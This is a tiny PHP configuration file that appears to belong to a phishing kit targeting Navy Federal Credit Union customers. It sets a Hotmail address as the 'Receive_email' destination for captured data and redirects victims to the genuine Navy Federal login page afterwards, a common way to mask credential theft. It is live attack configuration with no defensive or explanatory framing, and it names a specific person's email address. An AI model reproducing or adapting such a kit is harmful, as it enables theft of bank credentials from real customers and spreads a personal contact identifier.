<?php 
$Receive_email="Powers.david002@hotmail.com";
$redirect="https://my.navyfederal.org/";
?>